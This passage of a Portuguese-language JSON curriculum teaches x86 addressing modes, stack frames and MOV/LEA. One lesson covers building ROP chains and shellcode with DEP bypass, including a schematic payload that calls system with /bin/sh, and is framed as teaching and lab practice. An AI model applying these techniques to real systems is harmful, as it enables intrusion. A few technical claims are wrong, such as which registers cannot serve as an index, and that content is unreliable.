                                    "Liste diferenças iniciais em termos de opcode e flexibilidade."
                                  ],
                                  "verification": "Crie uma tabela comparando 3 exemplos de cada modo básico, sem indexação.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação Intel x86 manuals (Vol. 2), editor de texto ou Notion para tabela.",
                                  "tips": "Use diagramas visuais para mapear registrador -> memória.",
                                  "learningObjective": "Dominar definições e exemplos de modos direto, indireto e baseado.",
                                  "commonMistakes": "Confundir modo indireto com direto; lembre que indireto requer colchetes [] e registrador."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compreender o Modo Indexado e Estrutura do SIB Byte",
                                  "subSteps": [
                                    "Aprenda fórmula do modo indexado: Effective Address = Base + (Index * Scale) + Displacement.",
                                    "Estude componentes: Base (ex: EBX), Index (ex: ECX), Scale (1,2,4,8), Disp (8/32 bits).",
                                    "Analise estrutura do SIB byte: 1 byte com campos ModR/M.SS (scale), Index, Base.",
                                    "Identifique quando SIB é usado: ModR/M.mod=00/01/10 e r/m=100b, ou ESP como base.",
                                    "Examine opcodes em exemplos como mov eax, [ebx + ecx*4 + 10]."
                                  ],
                                  "verification": "Desenhe a estrutura bit-a-bit do SIB byte para um exemplo específico e decode manualmente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Intel x86 manual (seção 2.1.6), calculadora binária online, papel para diagramas.",
                                  "tips": "Lembre: Scale 0=1,1=2,2=4,3=8; Index 4/5 indicam sem indexação.",
                                  "learningObjective": "Decodificar manualmente endereços indexados e identificar necessidade de SIB.",
                                  "commonMistakes": "Ignorar que SIB é obrigatório para scale>1 ou indexações complexas; sempre cheque r/m=100b."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Modo Indexado com Outros Modos",
                                  "subSteps": [
                                    "Compare com direto: indexado é dinâmico (registradores variáveis) vs. fixo.",
                                    "Destaque vs. indireto: indexado adiciona scale e disp múltiplos vs. simples ponteiro.",
                                    "Diferencie de baseado: indexado inclui fator de escala no index vs. apenas disp.",
                                    "Analise impacto em desmontagem: indexado gera SIB byte extra, visível em ferramentas.",
                                    "Crie fluxograma para classificar um ModR/M byte como indexado."
                                  ],
                                  "verification": "Classifique 5 instruções de amostra (direto, indireto, baseado, indexado) explicando por quê.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Exemplos de assembly em arquivo .asm, tabela de ModR/M do manual Intel.",
                                  "tips": "Foque em presença de SIB como marcador chave de indexado complexo.",
                                  "learningObjective": "Diferenciar precisamente indexado por critérios de opcode e componentes.",
                                  "commonMistakes": "Equiparar baseado simples a indexado; baseado não tem scale/index separado."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Identificação via Desmontagem em Ferramentas",
                                  "subSteps": [
                                    "Instale e abra ferramenta (GDB/Objdump/IDA Free).",
                                    "Compile código assembly simples com modos mistos e desmonte.",
                                    "Identifique indexado: procure SIB bytes em hex dump e labels como [base+idx*scale+disp].",
                                    "Compare desmontagens: altere código para outros modos e observe diferenças.",
                                    "Debug passo-a-passo rastreando effective address computation."
                                  ],
                                  "verification": "Desmonte 3 binários, anote 2 exemplos de indexado vs. outros, com screenshots.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "GCC para compilar .asm, GDB ou Ghidra (gratuito), exemplos de código assembly.",
                                  "tips": "Use 'objdump -d binario' para dump rápido; foque em instruções MOV/LEA.",
                                  "learningObjective": "Aplicar diferenciação em cenários reais de engenharia reversa.",
                                  "commonMistakes": "Não notar SIB em hex; sempre corrija view para mostrar bytes raw."
                                }
                              ],
                              "practicalExample": "Compile e desmonte: mov eax, [ebx + 4*ecx + 0x10] (indexado com SIB: scale=2 para *4). Compare com mov eax, [ebx + 0x10] (baseado, sem SIB). Em GDB: 'x/i $pc' mostra [ebx+ecx*4+0x10] vs. [ebx+0x10].",
                              "finalVerifications": [
                                "Explicar quando SIB byte é emitido (r/m=100b).",
                                "Classificar corretamente 5 instruções mistas.",
                                "Decodificar SIB byte manualmente de um hex dump.",
                                "Rastrear effective address em debugger.",
                                "Diferenciar indexado de baseado/indireto em desmontagem real."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de SIB (100% em 5 exemplos).",
                                "Correta explicação de componentes (base/index/scale/disp).",
                                "Uso correto de ferramentas para verificação prática.",
                                "Clareza em comparações tabulares/fluxogramas.",
                                "Ausência de confusões comuns como equiparar baseado a indexado."
                              ],
                              "crossCurricularConnections": [
                                "Programação de Baixo Nível (otimização de arrays em C/Assembly).",
                                "Estruturas de Dados (acesso indexado a vetores/matrizes).",
                                "Segurança Computacional (análise de buffer overflows via modos).",
                                "Arquitetura de Computadores (cálculo de endereços em pipeline).",
                                "Engenharia Reversa (ferramentas como IDA/Ghidra)."
                              ],
                              "realWorldApplication": "Em análise de malware, diferenciar acessos indexados em exploits ROP ou shellcode permite detectar manipulações de arrays dinâmicos; em debugging de firmware, identifica otimizações de memória em binários embedded."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.3.4",
                        "name": "Modo de Endereçamento Baseado em Registradores",
                        "description": "Modos baseados em registradores combinam registrador base com deslocamentos fixos ou variáveis, fundamentais para stack frames e acessos relativos em funções em Assembly 32/64 bits.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.3.4.1",
                            "name": "Identificar base + deslocamento",
                            "description": "Reconhecer [ebp - 4] em 32 bits ou [rbp - 8] em 64 bits para acesso a parâmetros locais, calculando offsets relativos ao frame pointer em chamadas de sistema.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o Conceito de Frame Pointer e Stack Frame",
                                  "subSteps": [
                                    "Estude a estrutura básica do stack frame em assembly 32 e 64 bits.",
                                    "Identifique o papel do EBP/RBP como frame pointer, que aponta para o base do frame atual.",
                                    "Aprenda como variáveis locais são alocadas abaixo do frame pointer (offsets negativos).",
                                    "Revise o ciclo de vida de uma função: prologue (push ebp; mov ebp, esp), body, epilogue (mov esp, ebp; pop ebp).",
                                    "Compare diferenças entre 32 bits (EBP/ESP) e 64 bits (RBP/RSP)."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito o que acontece no prologue de uma função e desenhe um diagrama simples do stack frame.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação de assembly x86/x64 (Intel manuals), diagramas de stack frame online, debugger como GDB ou OllyDbg.",
                                  "tips": "Use diagramas visuais para mapear o stack; memorize que offsets negativos acessam locais.",
                                  "learningObjective": "Compreender o frame pointer como base para endereços relativos no stack.",
                                  "commonMistakes": "Confundir EBP com ESP (ESP varia, EBP é fixo); ignorar diferenças 32/64 bits."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Reconhecer Padrões de Base + Deslocamento em Código Assembly",
                                  "subSteps": [
                                    "Analise instruções como mov eax, [ebp - 4] ou mov rax, [rbp - 8].",
                                    "Identifique o registrador base (EBP/RBP) e o sinal/valor do deslocamento.",
                                    "Pratique lendo dumps de memória ou listagens de assembly de funções simples.",
                                    "Diferencie de outros modos: base + índice vs. base + deslocamento.",
                                    "Use um disassembler para inspecionar binários compilados de C simples."
                                  ],
                                  "verification": "Marque 5 exemplos de código assembly fornecidos, identificando corretamente base + deslocamento em todos.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Exemplos de código C compilado para assembly (gcc -S), ferramentas como objdump ou IDA Free.",
                                  "tips": "Procure por [ebp/rbp - N] onde N é múltiplo de 4/8; ignore registradores como EAX.",
                                  "learningObjective": "Reconhecer sintaxe [base + deslocamento] para acesso a parâmetros locais.",
                                  "commonMistakes": "Confundir com modo absoluto (sem colchetes ou sem base); não notar offsets negativos."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Calcular Offsets Relativos ao Frame Pointer",
                                  "subSteps": [
                                    "Compile um programa C com variáveis locais e analise o assembly gerado.",
                                    "Calcule offsets: primeira variável local tipicamente [ebp-4]/[rbp-8], próxima [ebp-8]/[rbp-16], etc.",
                                    "Ajuste para tipos de dados: int (4 bytes 32-bit), long (8 bytes 64-bit).",
                                    "Simule stack em papel ou ferramenta, alocando espaço com sub esp/esp, N.",
                                    "Verifique com debugger: pause na função e examine memória em EBP/RBP."
                                  ],
                                  "verification": "Dado um snippet de C e seu assembly, calcule e liste offsets corretos para 3 variáveis locais.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Compilador GCC/Clang, debugger GDB/WinDbg, exemplos de código C com variáveis locais.",
                                  "tips": "Lembre: alinhamento de stack (4/8 bytes); conte de baixo para cima do frame pointer.",
                                  "learningObjective": "Calcular precisamente offsets para acessar variáveis locais via frame pointer.",
                                  "commonMistakes": "Esquecer alinhamento (ex: struct pode pular bytes); confundir ordem de declaração com alocação."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar em Chamadas de Sistema e Análise Prática",
                                  "subSteps": [
                                    "Analise assembly de chamadas de sistema (syscall/int 0x80) com parâmetros locais.",
                                    "Identifique como parâmetros são passados via stack e acessados via [ebp - offset].",
                                    "Desmonte um binário real com strace ou similar para correlacionar chamadas.",
                                    "Pratique modificando offsets em debugger para observar efeitos.",
                                    "Documente um exemplo completo: de C para assembly com cálculo de offset."
                                  ],
                                  "verification": "Analise um binário fornecido, identifique e explique 2 acessos base+deslocamento em chamadas de sistema.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Binários de exemplo (ex: hello world com syscall), strace, disassemblers como Radare2.",
                                  "tips": "Em syscalls 64-bit, parâmetros em registradores, mas locais ainda via RBP; foque em funções wrapper.",
                                  "learningObjective": "Integrar identificação e cálculo em contextos reais de chamadas de sistema.",
                                  "commonMistakes": "Ignorar convenções de chamada (cdecl vs stdcall); não considerar otimizações do compilador."
                                }
                              ],
                              "practicalExample": "Compile este C: int main() { int a=1, b=2; syscall_write(1, &a, 4); }. No assembly: mov DWORD PTR [ebp-4], 1; mov DWORD PTR [ebp-8], 2; lea ecx, [ebp-4]; ... Identifique [ebp-4] como base (ebp) + deslocamento (-4) para 'a'.",
                              "finalVerifications": [
                                "Corretamente desenhar stack frame com offsets para 3 variáveis.",
                                "Identificar base+deslocamento em 10 snippets de assembly mistos.",
                                "Calcular offsets precisos em um programa C compilado.",
                                "Explicar diferenças 32/64 bits em um exemplo.",
                                "Analisar chamadas de sistema com acessos locais.",
                                "Simular em debugger sem erros."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de [base + deslocamento] (90% acerto).",
                                "Correção nos cálculos de offset considerando tamanho/tipo (100%).",
                                "Compreensão conceitual via explicações claras.",
                                "Aplicação prática em debuggers/disassemblers.",
                                "Integração com chamadas de sistema.",
                                "Evitar erros comuns como confusão de registradores."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Mapeamento de variáveis locais para stack.",
                                "Debugging e Ferramentas: Uso de GDB/IDA para análise estática/dinâmica.",
                                "Segurança Computacional: Buffer overflows explorando stack frames.",
                                "Arquitetura de Computadores: Gerenciamento de memória e pilha."
                              ],
                              "realWorldApplication": "Em reverse engineering de malwares, identificar acessos a credenciais locais via [rbp - offset] para hooks; em debugging de crashes, calcular offsets para inspecionar variáveis corrompidas; em exploits, manipular stack frames para ROP chains."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.3.4.2",
                            "name": "Analisar uso em ROP e shellcodes",
                            "description": "Examinar gadgets ROP usando modos baseados em RSP/RBP para controle de fluxo, com exemplos de return-oriented programming em binários ELF/PE.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Conceitos Fundamentais de ROP e Modos RSP/RBP",
                                  "subSteps": [
                                    "Estude o papel de RSP (Stack Pointer) e RBP (Base Pointer) no controle de fluxo em Assembly x86/x64.",
                                    "Aprenda o que são gadgets ROP: sequências curtas de instruções terminando em 'ret' para manipular o stack.",
                                    "Identifique como modos baseados em RSP/RBP permitem endereçamento indireto para chaining de gadgets.",
                                    "Revise diferenças entre ELF (Linux) e PE (Windows) em termos de stack layout.",
                                    "Pratique leitura de manuais de Assembly para instruções como POP RSP, MOV RSP, [RBP], etc."
                                  ],
                                  "verification": "Explique em suas palavras como RSP/RBP controlam o fluxo em ROP e liste 3 gadgets comuns.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação Intel x86/x64, tutoriais ROP (ex: LiveOverflow no YouTube), editor de texto para notas.",
                                  "tips": "Use diagramas para visualizar o stack antes/depois de um 'ret'.",
                                  "learningObjective": "Compreender o mecanismo de ROP via RSP/RBP para análise posterior.",
                                  "commonMistakes": "Confundir RSP com RIP; ignorar alinhamento de stack (8 bytes em x64)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Gadgets ROP Baseados em RSP/RBP em Binários",
                                  "subSteps": [
                                    "Compile um binário ELF/PE simples vulnerável (ex: buffer overflow sem ASLR).",
                                    "Use ferramentas como ROPgadget ou objdump para extrair gadgets contendo RSP/RBP.",
                                    "Filtre gadgets como 'pop rsp; ret', 'mov rsp, rbp; pop rbp; ret'.",
                                    "Compare gadgets em ELF vs PE, notando seções como .text vs code caves.",
                                    "Anote endereços e assembly de 5-10 gadgets relevantes."
                                  ],
                                  "verification": "Gere uma lista de pelo menos 5 gadgets RSP/RBP de um binário de exemplo.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "ROPgadget, objdump/readelf (ELF), CFF Explorer ou PEiD (PE), binário vulnerável de exemplo (ex: de CTF).",
                                  "tips": "Execute 'ROPgadget --binary vuln --string rsp' para busca rápida.",
                                  "learningObjective": "Dominar extração de gadgets específicos para ROP chains.",
                                  "commonMistakes": "Não desabilitar ASLR/DEP ao testar; confundir little-endian em endereços."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Controle de Fluxo com Gadgets RSP/RBP",
                                  "subSteps": [
                                    "Construa um ROP chain simples usando 3 gadgets RSP/RBP para redirecionar fluxo.",
                                    "Simule execução passo-a-passo com diagramas de stack, mostrando mudanças em RSP/RBP.",
                                    "Teste em debugger: configure breakpoints em gadgets e observe controle de fluxo.",
                                    "Analise cenários de shellcode: como ROP prepara stack para execve/system call.",
                                    "Compare chains em x86 (32-bit) vs x64, focando em calling conventions."
                                  ],
                                  "verification": "Desenhe e explique um ROP chain que usa RSP/RBP para chamar uma função.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "GDB/PEDA (ELF), x64dbg/WinDbg (PE), Python para pwntools scripting.",
                                  "tips": "Use 'gef' ou 'PEDA' no GDB para visualização de stack intuitiva.",
                                  "learningObjective": "Analisar dinamicamente como gadgets manipulam fluxo via RSP/RBP.",
                                  "commonMistakes": "Esquecer de alinhar RSP (add rsp, 8); overflow incorreto em chains."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Análise em Exemplos de Shellcodes ROP",
                                  "subSteps": [
                                    "Desmonte um shellcode ROP real de CTF/exploit conhecido (ex: ret2libc com RSP adjust).",
                                    "Identifique uso de RBP para pivotar stack em binários com canary.",
                                    "Construa e teste um shellcode híbrido: ROP para bypass DEP + shellcode.",
                                    "Documente limitações em ELF (NX) vs PE (DEP) e mitigações como stack cookies.",
                                    "Otimize chain minimizando gadgets e maximizando eficiência."
                                  ],
                                  "verification": "Crie e execute um PoC ROP shellcode funcional em ambiente controlado.",
                                  "estimatedTime": "90 minutos",
                                  "materials": "Pwntools para automação, VM com vulnserver (Windows), ROP Emporium challenges.",
                                  "tips": "Comece com chains curtas; use 'cyclic' do pwntools para offsets precisos.",
                                  "learningObjective": "Integrar análise ROP em exploits reais com shellcodes.",
                                  "commonMistakes": "Ignorar mitigações modernas como CFI; testes sem isolamento (use VM)."
                                }
                              ],
                              "practicalExample": "Em um binário ELF vulnerável, gadget em 0x401000: 'pop rsp; pop rdi; ret'. Chain: payload = p64(pop_rsp_gadget) + p64(new_stack) + p64(system_gadget) + p64(binsh_addr). RSP é ajustado para stack limpo, permitindo shellcode exec.",
                              "finalVerifications": [
                                "Identifica corretamente gadgets RSP/RBP em binários ELF/PE dados.",
                                "Constrói ROP chain funcional com pelo menos 3 gadgets para controle de fluxo.",
                                "Explica diferenças de stack layout entre x86 e x64.",
                                "Simula execução de chain em debugger sem crashes.",
                                "Documenta análise completa com diagramas e endereços.",
                                "Aplica em shellcode PoC com bypass básico de proteções."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de gadgets (100% match com ferramentas).",
                                "Completude da análise de fluxo (inclui stack traces).",
                                "Criatividade e eficiência no design de chains.",
                                "Correção em simulações/execuções (sem erros lógicos).",
                                "Profundidade em exemplos ELF/PE comparativos.",
                                "Clareza na documentação e avoidance de erros comuns."
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86/x64: aprofundamento em registradores de stack.",
                                "Sistemas Operacionais: layouts de stack e calling conventions.",
                                "Engenharia Reversa: uso de disassemblers em exploits.",
                                "Criptografia: ROP em contextos de side-channel ou firmware.",
                                "Redes: exploits ROP em serviços remotos (ex: buffer overflow TCP)."
                              ],
                              "realWorldApplication": "Em pentesting e bug bounties, analisa binários para desenvolver exploits ROP em CTFs/red teaming, identifica vulnerabilidades em software legado (ex: servers sem ASLR), e contribui para hardening de binários via relatórios de segurança."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.2.4",
                    "name": "Acesso à Memória e Pilha",
                    "description": "Operações de leitura/escrita em memória, uso da pilha (PUSH/POP) e alinhamento em 32 e 64 bits.",
                    "individualConcepts": [
                      {
                        "id": "10.1.2.4.1",
                        "name": "Operações Básicas de Leitura e Escrita em Memória",
                        "description": "Instruções fundamentais para acessar memória em Assembly x86 32 e 64 bits, incluindo MOV, LEA e modos de endereçamento.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.4.1.1",
                            "name": "Identificar e usar instrução MOV em 32 bits",
                            "description": "Compreender como a instrução MOV realiza cópia de dados entre registradores, memória e imediatos em arquitetura x86-32, incluindo sintaxe [base + index*scale + displacement].",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o propósito e sintaxe básica da instrução MOV",
                                  "subSteps": [
                                    "Ler a definição oficial da MOV na documentação Intel: realiza cópia unidirecional de dados sem alterar flags de condição.",
                                    "Identificar os operandos permitidos: registrador para registrador, registrador para memória, memória para registrador, imediato para registrador ou memória.",
                                    "Memorizar a sintaxe geral: MOV destino, fonte (destino não pode ser imediato).",
                                    "Analisar restrições: tamanho dos operandos deve coincidir (byte, word, dword em 32 bits).",
                                    "Explicar verbalmente ou por escrito o fluxo de execução da instrução."
                                  ],
                                  "verification": "Escrever uma definição própria da MOV e listar 3 exemplos válidos de sintaxe com explicação.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86-32 (manual de instruções)",
                                    "Editor de texto ou bloco de notas"
                                  ],
                                  "tips": "Sempre verifique o tamanho dos operandos para evitar erros de truncamento.",
                                  "learningObjective": "Dominar o conceito fundamental da MOV e suas regras de operandos em x86-32.",
                                  "commonMistakes": [
                                    "Confundir MOV com instruções aritméticas como ADD que alteram flags",
                                    "Acreditar que a cópia é bidirecional ou que flags são modificadas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Praticar MOV entre registradores",
                                  "subSteps": [
                                    "Escrever código assembly simples: MOV EAX, EBX.",
                                    "Compilar e executar em um emulador como DOSBox ou QEMU para observar o efeito nos registradores.",
                                    "Usar um debugger (ex: GDB) para inspecionar valores antes e após a MOV.",
                                    "Testar com registradores de 32 bits como EAX, ECX, ESP, EBP.",
                                    "Variar com tamanhos menores: MOV AX, BX (word) e MOV AL, BL (byte)."
                                  ],
                                  "verification": "Executar código e confirmar via debugger que o valor foi copiado corretamente sem alterar outros registradores.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Emulador x86-32 (NASM + QEMU)",
                                    "Debugger GDB ou OllyDbg"
                                  ],
                                  "tips": "Use registradores preservados para evitar sobrescrita acidental de dados importantes.",
                                  "learningObjective": "Executar e verificar MOV entre registradores de diferentes tamanhos.",
                                  "commonMistakes": [
                                    "Usar registradores incompatíveis em tamanho (ex: MOV EAX, BX)",
                                    "Esquecer de inicializar valores nos registradores fonte"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Dominar MOV com valores imediatos",
                                  "subSteps": [
                                    "Escrever MOV reg, imediato: ex. MOV EAX, 0xDEADBEEF.",
                                    "Testar limites: imediato de 32 bits signed/unsigned.",
                                    "Executar e verificar em debugger o carregamento direto.",
                                    "Praticar MOV memória, imediato: MOV [EBP-4], 42.",
                                    "Analisar representação em bytes no código objeto."
                                  ],
                                  "verification": "Compilar, executar e inspecionar memória/registradores para confirmar o valor imediato copiado.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Assemblador NASM",
                                    "Debugger como x32dbg"
                                  ],
                                  "tips": "Imediatos grandes são sign-extended se necessário; teste com valores negativos.",
                                  "learningObjective": "Usar corretamente MOV para inicializar registradores e memória com constantes.",
                                  "commonMistakes": [
                                    "Exceder o tamanho do imediato permitido para o operando (ex: 64-bit em 32-bit reg)",
                                    "Confundir sintaxe de imediato hexadecimal vs decimal"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar MOV com modos de endereçamento de memória",
                                  "subSteps": [
                                    "Estudar sintaxe: [base + index*scale + displacement] onde scale=1,2,4,8; base/index=registradores.",
                                    "Praticar simples: MOV EAX, [EBP+8] (parâmetro de pilha).",
                                    "Complexo: MOV ECX, [ESI + EAX*4 + 0x10] (array com offset).",
                                    "Escrever código que use pilha: MOV [ESP-4], EDX.",
                                    "Debugar para verificar cálculo do endereço efetivo."
                                  ],
                                  "verification": "Calcular manualmente endereço efetivo e comparar com debugger; código executa sem crash.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação Intel (Volume 2)",
                                    "Emulador Bochs ou VMware com assembly",
                                    "Debugger OllyDbg"
                                  ],
                                  "tips": "Lembre: ESP/EDX não podem ser index em alguns modos; teste com valores reais.",
                                  "learningObjective": "Identificar e codificar MOV com endereçamento complexo em x86-32.",
                                  "commonMistakes": [
                                    "Erro em scale (só 1,2,4,8)",
                                    "Confundir base/index ou esquecer parênteses nos colchetes"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Integrar e praticar identificação em códigos reais",
                                  "subSteps": [
                                    "Analisar snippet de código desmontado de um binário simples.",
                                    "Identificar todas as MOVs e classificar por tipo (reg-reg, imm, mem).",
                                    "Reescrever trecho modificando MOVs para alterar comportamento.",
                                    "Simular execução passo a passo manualmente.",
                                    "Criar mini-programa com múltiplas MOVs e testar."
                                  ],
                                  "verification": "Desmontar código, listar MOVs corretamente e modificar sem erros.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ferramenta de desmontagem IDA Free ou Ghidra",
                                    "Exemplos de binários assembly compilados"
                                  ],
                                  "tips": "Procure padrões como MOV para preparar argumentos de chamadas.",
                                  "learningObjective": "Identificar MOV em contextos reais de análise binária.",
                                  "commonMistakes": [
                                    "Interpretar MOV como store ao invés de load",
                                    "Ignorar tamanho implícito pelo operando"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um programa assembly para análise de segurança, use MOV EAX, 0x41414141 (preenche com 'AAAA'); MOV [EBP-0x10], EAX (armazena em buffer local); MOV ECX, [ESP+4] (lê parâmetro). Compile com NASM, execute em debugger e observe overflow potencial em buffer.",
                              "finalVerifications": [
                                "Identificar corretamente 5 MOVs variadas em um código desmontado.",
                                "Escrever 3 instruções MOV complexas sem erros de sintaxe.",
                                "Calcular endereço efetivo de [EBX + ECX*4 - 8] com valores dados.",
                                "Explicar diferença entre MOV reg, mem e MOV mem, reg.",
                                "Executar programa com MOVs e verificar ausência de crashes ou flags erradas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na sintaxe e modos de endereçamento (100% correto).",
                                "Compreensão demonstrada em explicações e cálculos manuais.",
                                "Eficiência no uso de debugger para verificação.",
                                "Identificação correta de tipos de MOV em snippets reais.",
                                "Aplicação em contexto de segurança (ex: detecção de payloads)."
                              ],
                              "crossCurricularConnections": [
                                "Linguagem C: Equivalente a atribuições *ptr = reg e reg = *ptr com aritmética de ponteiros.",
                                "Sistemas Operacionais: Acesso à pilha e heap via EBP/ESP em chamadas de função.",
                                "Matemática: Cálculo de endereços lineares com multiplicação (scale).",
                                "Segurança Computacional: Análise de exploits como buffer overflow via MOVs.",
                                "Engenharia de Software: Otimização de código assembly gerado por compiladores."
                              ],
                              "realWorldApplication": "Na análise de malware e reverse engineering, identificar MOVs permite mapear fluxos de dados, detectar preparo de shells ou payloads em exploits (ex: ROP chains), e entender vulnerabilidades em binários como em CTFs ou incident response."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.1.2",
                            "name": "Aplicar MOV e LEA em 64 bits",
                            "description": "Analisar diferenças no uso de MOV e LEA em x86-64, como endereçamento RIP-relative e registradores de 64 bits (RAX, RBX), com exemplos de leitura/escrita em memória.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a instrução MOV em x86-64",
                                  "subSteps": [
                                    "Estude os registradores de 64 bits principais: RAX, RBX, RCX, RDX, RSI, RDI, RBP, RSP.",
                                    "Analise sintaxe básica: MOV destino, origem (registrador para registrador, imediato para registrador, memória para registrador).",
                                    "Pratique MOV com endereçamento direto: MOV RAX, [endereço].",
                                    "Explore extensões de sinal para immediatos de 32 bits em 64 bits.",
                                    "Teste em um assembler como NASM ou debugger GDB."
                                  ],
                                  "verification": "Escreva e execute 3 exemplos de MOV válidos, verificando valores nos registradores via GDB.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação Intel x86-64 Manual Vol. 2",
                                    "NASM assembler",
                                    "GDB debugger"
                                  ],
                                  "tips": "Sempre verifique o tamanho dos operandos para evitar truncamento.",
                                  "learningObjective": "Dominar o uso de MOV para transferência de dados em registradores e memória em 64 bits.",
                                  "commonMistakes": [
                                    "Usar registradores de 32 bits como EAX em contextos de 64 bits sem REX prefix",
                                    "Ignorar sign-extension em immediatos",
                                    "Confundir operandos de memória com registradores"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compreender a instrução LEA em x86-64",
                                  "subSteps": [
                                    "Entenda que LEA calcula endereços sem acessar memória: LEA RAX, [RBX + RCX*8 + 10].",
                                    "Compare com MOV: LEA é para aritmética de endereços, não leitura.",
                                    "Pratique escalas e deslocamentos: *1, *2, *4, *8.",
                                    "Analise uso com registradores base/index.",
                                    "Compile um programa C simples e disasseemble para ver LEA gerado."
                                  ],
                                  "verification": "Gere um endereço complexo com LEA e confirme o valor calculado em GDB sem dereferência.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Intel x86-64 Manual",
                                    "GCC compiler",
                                    "objdump para disassembly"
                                  ],
                                  "tips": "Use LEA para cálculos rápidos como multiplicação por constantes (ex: LEA RAX, [RAX*2 + 4]).",
                                  "learningObjective": "Aplicar LEA para computação de endereços eficientes sem acesso à memória.",
                                  "commonMistakes": [
                                    "Confundir LEA com MOV [endereço] (LEA não lê memória)",
                                    "Esquecer prefixos REX para registradores altos",
                                    "Usar LEA desnecessariamente onde MOV basta"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar endereçamento RIP-relative e diferenças chave",
                                  "subSteps": [
                                    "Estude RIP-relative: LEA RAX, [RIP + offset] para acesso a dados relativos à posição do código.",
                                    "Compare MOV vs LEA: MOV carrega valor, LEA carrega endereço.",
                                    "Identifique em disassembly: [rip + disp] vs endereços absolutos.",
                                    "Pratique conversão de endereços absolutos para RIP-relative.",
                                    "Teste em código position-independent (PIE)."
                                  ],
                                  "verification": "Disasseemble um binário e identifique 2 usos de RIP-relative, calculando offsets manualmente.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "objdump ou Ghidra",
                                    "Exemplos de código PIC",
                                    "Intel Manual seção RIP-relative"
                                  ],
                                  "tips": "RIP-relative é comum em binários modernos para ASLR; offset = endereço_dado - (RIP + 4).",
                                  "learningObjective": "Diferenciar usos de MOV e LEA, focando em RIP-relative para acessos modernos.",
                                  "commonMistakes": [
                                    "Calcular offset errado (esquecer +4 ou +7 bytes da instrução)",
                                    "Assumir endereços absolutos em 64 bits",
                                    "Misturar RIP com RSP"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar leitura e escrita em memória com MOV e LEA",
                                  "subSteps": [
                                    "Escreva código: Use LEA para endereço, MOV para escrever/leitura (ex: MOV [RAX], RBX; MOV RAX, [RAX]).",
                                    "Combine: LEA RDI, [RIP + msg]; MOV RSI, [RDI] para strings.",
                                    "Teste cenários: Pilha (RSP), heap simulado.",
                                    "Analise performance: LEA evita cache miss vs MOV [mem].",
                                    "Debugue erros de segmentação ou invalidação."
                                  ],
                                  "verification": "Execute um programa que leia/escreva memória usando ambos, confirmando dados via GDB ou printf.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "NASM/GAS assembler",
                                    "GDB",
                                    "Exemplos de código assembly"
                                  ],
                                  "tips": "Combine com PUSH/POP para pilha; valide alinhamento de memória.",
                                  "learningObjective": "Implementar operações de memória reais diferenciando MOV e LEA.",
                                  "commonMistakes": [
                                    "Dereferenciar LEA desnecessariamente",
                                    "Overflow em cálculos de endereço",
                                    "Acessar memória inválida sem proteção"
                                  ]
                                }
                              ],
